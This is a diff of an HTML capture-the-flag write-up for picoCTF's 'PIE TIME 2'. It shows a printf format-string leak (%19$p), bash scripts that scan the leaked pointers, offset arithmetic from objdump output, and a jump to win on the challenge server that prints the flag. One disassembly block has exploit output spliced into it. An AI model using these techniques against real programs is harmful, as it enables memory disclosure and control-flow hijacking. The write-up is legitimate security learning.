@@ -8,13 +8,43 @@
 <p>Can you try to get the flag? I'm not revealing anything anymore!!
 Additional details will be available after launching your challenge instance.</p>
 </blockquote>
+<h4>My attempts</h4>
 <p>This prompted me to look at the PIE TIME 1 to refresh my mind on what kind things it entailed. It was a program that you gave a memroy address so you could jump to the win function.</p>
-<p>I tried doing an <code>objdump -d vuln</code> to see the memroy addresses of the functions. I found where the scanf happens and wehre the win function is. There is alo a printf vunerability as its not a string lineral from an buffer input. First thing I tried to exploit the printf vunerability is to do a enter a string of <code>%p</code>.</p>
+<p>I tried doing an <code>objdump -d vuln</code> to see the memroy addresses of the functions. I found where the scanf happens and wehre the win function is. I also found where the main function is:</p>
+<pre><code>0000000000001400 &lt;main&gt;:
+    1400:   f3 0f 1e fa             endbr64
+    1404:   55                      push   %rbp
+    1405:   48 89 e5                mov    %rsp,%rbp
+    1408:   48 8d 35 9a fe ff ff    lea    -0x166(%rip),%rsi        # 12a9 &lt;segfault_handler&gt;
+    140f:   bf 0b 00 00 00          mov    $0xb,%edi
+    1414:   e8 57 fd ff ff          call   1170 &lt;signal@plt&gt;
+    1419:   48 8b 05 f0 2b 00 00    mov    0x2bf0(%rip),%rax        # 4010 &lt;stdout@GLIBC_2.2.5&gt;
+    1420:   b9 00 00 00 00          mov    $0x0,%ecx
+    1425:   ba 02 00 00 00          mov    $0x2,%edx
+    142a:   be 00 00 00 00          mov    $0x0,%esi
+    142f:   48 89 c7                mov    %rax,%rdi
+    1432:   e8 49 fd ff ff          call   1180 &lt;setvbuf@plt&gt;
+Enter your name:%19$p
+0x60076ac59441
+ enter the address to jump to, ex =&gt; 0x12345: 0x60076ac5936a
+You won!
+picoCTF{p13_5h0u1dn'7_134k_71356635}
+    1437:   b8 00 00 00 00          mov    $0x0,%eax
+    143c:   e8 86 fe ff ff          call   12c7 &lt;call_functions&gt;
+    1441:   b8 00 00 00 00          mov    $0x0,%eax
+    1446:   5d                      pop    %rbp
+    1447:   c3                      ret
+    1448:   0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
+    144f:   00
+
+</code></pre>
+<p>There is also a printf vunerability as its not a string lineral from an buffer input. First thing I tried to exploit the printf vunerability is to do a enter a string of <code>%p</code>.</p>
 <p><img alt="screen shot of terminal with %p... inputs" src="../images/terminal_000.png" /></p>
-<p>I wasnt too sure about c format exploits so i found examples on this <a href="https://exploit-notes.hdks.org/exploit/binary-exploitation/method/binary-exploitation-with-format-string/">site</a></p>
+<p>I wasnt too sure about c format exploits so I found examples on this <a href="https://exploit-notes.hdks.org/exploit/binary-exploitation/method/binary-exploitation-with-format-string/">site</a></p>
 <pre><code>$ Enter your name:%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
 0x558c6abc82a10xfbad22880x7fff0e5e73d0(nil)0x21001(nil)0x7f852f6917600x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x25702570257025(nil)0xfffbdc94dca48000x7fff0e5e74300x558c447c54410x10x7f852f4e524a0x7fff0e5e75300x558c447c54000x1447c40400x7fff0e5e75480x7fff0e5e75480xee96304b47191866(nil)0x7fff0e5e7558(nil)0x7f852f6f2020
 </code></pre>
+<p>I looking for a hex value that ends with 400, since the main function is at <code>0000000000001400</code>.</p>
 <pre><code class="language-python">&gt; &gt; &gt; for i in a.split(&quot;0x&quot;):
 &gt; &gt; &gt; ... print(i)
 &gt; &gt; &gt; ...
@@ -46,119 +76,150 @@ ee96304b47191866
 7fff0e5e7558
 7f852f6f2020
 </code></pre>
-<p>in the objdump i found <code>000000000000136a &lt;win&gt;:</code> and <code>1340: e8 5b fe ff ff          call   11a0 &lt;__isoc99_scanf@plt&gt;</code>. I suspect <code>7fff0e5e73d0</code> to be my current pointer address.
-this would mean that there is a 2A difference from 136A to 1340. so if i did 2a + 7fff0e5e73d0, I might jump to the win subroutine.</p>
-<p>None of this worked. When I entered any of the addresses I kept getting the: <code>Segfault Occurred, incorrect address.</code>.</p>
+<p>In the objdump I found <code>000000000000136a &lt;win&gt;:</code> and <code>1340: e8 5b fe ff ff          call   11a0 &lt;__isoc99_scanf@plt&gt;</code>. I thought <code>7fff0e5e73d0</code> to be my current pointer address but I was wrong.
+this would mean that there is a 2A difference from 136A to 1340. so if I did 2a + 7fff0e5e73d0, I might jump to the win subroutine.</p>
+<p>None of this worked. When I entered any of the addresses I kept getting the: <code>Segfault Occurred, incorrect address.</code>.
+I realised that the addresses starting with <code>0x7fff</code> were not where the program was located.</p>
 <p>I tried to write a script to print out different pointers:</p>
 <pre><code class="language-bash">#!/bin/bash
 
 for i in {1..128}; do
-    leak=$(echo -e &quot;%$i\$p&quot; | ./vuln | grep -o '0x[0-9a-fA-F]\{6,\}' | grep -v '^0x12345$')
+    leak=$(echo -e &quot;%$i\$p&quot; | ./vuln | grep -o '0x[0-9a-fA-F]\{3,\}400$')
     if [ -n &quot;$leak&quot; ]; then
-        echo &quot;$leak&quot;
+        echo &quot;value ($i): $leak&quot;
     fi
 done
 </code></pre>
-<p>I ran <code>bash script.sh | sort -u</code> to find all the unique addresses with no nils.</p>
 <p>this printed:</p>
-<pre><code>0x19940e040
-0x224b10834a80d4ba
-0x559173ebc441
-0x55e5e3ae9400
-0x55f9785fe1c0
-0x5603b5a291ee
-0x560a255d11c0
-0x563a268812a5
-0x5643098be040
-0x564cc0f2e400
-0x7f061bb96020
-0x7f1edad8a079
-0x7f27510b65e0
-0x7f37166d324a
-0x7f4ca82b1760
-0x7f787f6ed299
-0x7f9a69cfe305
-0x7fa9423cc760
-0x7fe84ba3d000
-0x7ff500000000
-0x7ffc175c45f8
-0x7ffc17d94e17
-0x7ffc1b8b7d21
-0x7ffc4449b600
-0x7ffc53ef1544
-0x7ffc5526d4bb
-0x7ffc889944a5
-0x7ffcee2253f0
-0x7ffd12ca3344
-0x7ffd19da16d0
-0x7ffd1b616e48
-0x7ffd3647fe08
-0x7ffd4805a57a
-0x7ffd4bebcdb9
-0x7ffd60dc4357
-0x7ffd65e1e5cb
-0x7ffd8af30f97
-0x7ffd9033a468
-0x7ffd94597d77
-0x7ffdb1a163c9
-0x7ffdc0093ddb
-0x7ffdc063b40b
-0x7ffdc201d3dc
-0x7ffdd99e55b6
-0x7ffe0385afcd
-0x7ffe2d1c8cf6
-0x7ffe30a26f60
-0x7ffe35f334ef
-0x7ffe39a025da
-0x7ffe5f730248
-0x7ffe7ece552e
-0x7ffe8e01bd8e
-0x7ffea08e2e29
-0x7ffeabcf7468
-0x7ffec0344491
-0x7ffec359efe8
-0x7ffed0941515
-0x7ffed884a4d7
-0x7ffee0eabe0c
-0x7ffeed489000
-0x7ffeedb44456
-0x7ffefce2b4fb
-0x7fff0dcb4f86
-0x7fff1f643e04
-0x7fff232b9dd2
-0x7fff27dd1da5
-0x7fff28b32df9
-0x7fff60478948
-0x7fff70b995e7
-0x7fff726da8a0
-0x7fff83e2042a
-0x7fff936f6848
-0x7fff9bf2dcdc
-0x7fffb3aa0377
-0x7fffb410ed07
-0x7fffcaa8933d
-0x7fffda6e0ec0
-0x7ffff11f0998
-0x7ffffaa2f413
-0x82a4ac3e8a61bd65
-0xa702431
-0xa702433
-0xa70243825
-0xbcbefc29544bdf12
-0xbfebfbff
-0xc69412d00aa6ca00
-0xe10d7314ac105b00
-0xfbad2088
+<pre><code>value (17): 0x9c36dda991ec400
+value (23): 0x5640a8443400
+value (42): 0x55bbb4a89400
 </code></pre>
-<p>This printed out the frist 128 pointers on the stack which is essetially what <code>%p%p%p..</code> did</p>
-<p>I ran through all these addresses with this script:</p>
+<p>This printed out the frist 128 pointers on the stack which is essetially what <code>%p%p%p..</code> did, then only selects the values that end with 400.
+Those 2 smaller numbers ends with 400 so I have a suspision that it might be the address of the main function. I am going to try the 23rd and the 42th</p>
+<p><code>%23$p</code>,<code>%42$p</code>
+both seem to loop back to the main.</p>
+<pre><code>000000000000136a &lt;win&gt;:
+    136a:   f3 0f 1e fa             endbr64
+    136e:   55                      push   %rbp
+    136f:   48 89 e5                mov    %rsp,%rbp
+    1372:   48 83 ec 10             sub    $0x10,%rsp
+    1376:   48 8d 3d f6 0c 00 00    lea    0xcf6(%rip),%rdi        # 2073 &lt;_IO_stdin_used+0x73&gt;
+    137d:   e8 8e fd ff ff          call   1110 &lt;puts@plt&gt;
+    1382:   48 8d 35 f3 0c 00 00    lea    0xcf3(%rip),%rsi        # 207c &lt;_IO_stdin_used+0x7c&gt;
+    1389:   48 8d 3d ee 0c 00 00    lea    0xcee(%rip),%rdi        # 207e &lt;_IO_stdin_used+0x7e&gt;
+    1390:   e8 fb fd ff ff          call   1190 &lt;fopen@plt&gt;
+    1395:   48 89 45 f8             mov    %rax,-0x8(%rbp)
+    1399:   48 83 7d f8 00          cmpq   $0x0,-0x8(%rbp)
+    139e:   75 16                   jne    13b6 &lt;win+0x4c&gt;
+    13a0:   48 8d 3d e0 0c 00 00    lea    0xce0(%rip),%rdi        # 2087 &lt;_IO_stdin_used+0x87&gt;
+    13a7:   e8 64 fd ff ff          call   1110 &lt;puts@plt&gt;
+    13ac:   bf 00 00 00 00          mov    $0x0,%edi
+    13b1:   e8 fa fd ff ff          call   11b0 &lt;exit@plt&gt;
+    13b6:   48 8b 45 f8             mov    -0x8(%rbp),%rax
+    13ba:   48 89 c7                mov    %rax,%rdi
+    13bd:   e8 8e fd ff ff          call   1150 &lt;fgetc@plt&gt;
+    13c2:   88 45 f7                mov    %al,-0x9(%rbp)
+    13c5:   eb 1a                   jmp    13e1 &lt;win+0x77&gt;
+    13c7:   0f be 45 f7             movsbl -0x9(%rbp),%eax
+    13cb:   89 c7                   mov    %eax,%edi
+    13cd:   e8 2e fd ff ff          call   1100 &lt;putchar@plt&gt;
+    13d2:   48 8b 45 f8             mov    -0x8(%rbp),%rax
+    13d6:   48 89 c7                mov    %rax,%rdi
+    13d9:   e8 72 fd ff ff          call   1150 &lt;fgetc@plt&gt;
+    13de:   88 45 f7                mov    %al,-0x9(%rbp)
+    13e1:   80 7d f7 ff             cmpb   $0xff,-0x9(%rbp)
+    13e5:   75 e0                   jne    13c7 &lt;win+0x5d&gt;
+    13e7:   bf 0a 00 00 00          mov    $0xa,%edi
+    13ec:   e8 0f fd ff ff          call   1100 &lt;putchar@plt&gt;
+    13f1:   48 8b 45 f8             mov    -0x8(%rbp),%rax
+    13f5:   48 89 c7                mov    %rax,%rdi
+    13f8:   e8 23 fd ff ff          call   1120 &lt;fclose@plt&gt;
+    13fd:   90                      nop
+    13fe:   c9                      leave
+    13ff:   c3                      ret
+</code></pre>
+<p>win is at 136a so to jump to the win function I will replace the last 3 numbers of the address to 36a.</p>
+<pre><code>Enter your name:%23$p
+0x55a13c389400
+ enter the address to jump to, ex =&gt; 0x12345: 0x55a13c38936a
+You won!
+Cannot open file.
+</code></pre>
+<p>yay! I have completed it locally now I just need to netcat into the server and try it.</p>
+<p><code>nc rescued-float.picoctf.net 61043</code></p>
+<p>now to do the maths:
+<code>400 - 36a = 96</code></p>
+<p>the 23rd leaked address on the server is 0x7fff2d900528.</p>
+<p>I tried 0x7fff2d900492 but this didnt work. the 7fff doesnt look like the programs memory address.
+I modified my script and checked for numbers with 4 in the 3 last digit:</p>
+<h4>My solution</h4>
 <pre><code class="language-bash">#!/bin/bash
 
 for i in {1..128}; do
-    leak=$(echo -e &quot;%$i\$p&quot; | ./vuln | grep -o '0x[0-9a-fA-F]\{6,\}' | grep -v '^0x12345$')
+    leak=$(echo -e &quot;%$i\$p&quot; | ./vuln | grep -o '0x[0-9a-fA-F]\{3,\}4[0-9a-fA-F]\{2,\}$')
     if [ -n &quot;$leak&quot; ]; then
-        echo -e &quot;$leak\n$leak&quot; | ./vuln
+        echo &quot;value ($i): $leak&quot;
     fi
 done
 </code></pre>
-<p>but they still all result in segfualts.</p></body>
+<p>i got back:</p>
+<pre><code>value (1): 0xa702431
+value (3): 0xa702433
+value (8): 0xa70243825
+value (10): 0x7fd7cb4a45e0
+value (11): 0x7fa4a1785299
+value (13): 0x7fe4ff0c3079
+value (18): 0x7ffe89678430
+value (19): 0x55d3dcb5b441
+value (23): 0x55d3e5466400
+value (25): 0x7ffe5e47ba18
+value (27): 0xdf4cd488fdd47754
+value (32): 0x56583d90b436aa59
+value (33): 0x5cb55679c79cf4f8
+value (38): 0x7ffe453d6878
+value (41): 0x7faf641f8305
+value (42): 0x55ef09996400
+value (47): 0x559dacd421c0
+value (58): 0x7ffd46d78331
+value (60): 0x7ffd1458e3a3
+value (61): 0x7ffd3bfa43b6
+value (62): 0x7ffe0f64d3ca
+value (65): 0x7ffc215bf404
+value (66): 0x7ffc35b61430
+value (67): 0x7ffe632b3442
+value (68): 0x7fff9ff8546b
+value (69): 0x7ffcdc26247f
+value (70): 0x7ffcba872495
+value (71): 0x7ffe20f1d4b1
+value (72): 0x7fffddac14c9
+value (73): 0x7ffc189fe4d5
+value (74): 0x7ffd3b5d54ef
+value (83): 0x7ffc46b7acb6
+value (84): 0x7fffea24ecd0
+value (85): 0x7ffd34a3cce1
+value (87): 0x7ffea491cd51
+value (89): 0x7fff04cc4d7f
+value (93): 0x7fff40d2ddd3
+value (95): 0x7fff049fade6
+value (96): 0x7ffe5349edf1
+value (100): 0x7fff0ce24f60
+</code></pre>
+<p>value 19 seems to be a valid memory address and when I replace the last 2 numbers of the address with 0's it loops to the main function!</p>
+<p>I tried it on the server with the netcat and ...</p>
+<pre><code>Enter your name:%19$p
+0x5d1d8e79d441
+ enter the address to jump to, ex =&gt; 0x12345: 0x5d1d8e79d400
+Enter your name:
+ enter the address to jump to, ex =&gt; 0x12345:
+</code></pre>
+<p>There we go! all I need to do now is subtract (41+96) = d7 from the 19th leaked address and it should print me the flag!</p>
+<p>Sure enough! it does!:</p>
+<pre><code>Enter your name:%19$p
+0x60076ac59441
+ enter the address to jump to, ex =&gt; 0x12345: 0x60076ac5936a
+You won!
+picoCTF{p13_5h0u1dn'7_134k_71356635}
+</code></pre>
+<h4>Conclusion</h4>
+<p>In conclusion, I was able to leak the stack adresses of the program because of the <code>printf</code> being unsafe with out the <code>%s</code> inside it to specify a string in C. Once I found it I was able to deduct the address of one of the functions by using <code>objdump</code> to deassemble the C program. Then I put it all together on the server and it returned the flag.</p></body>
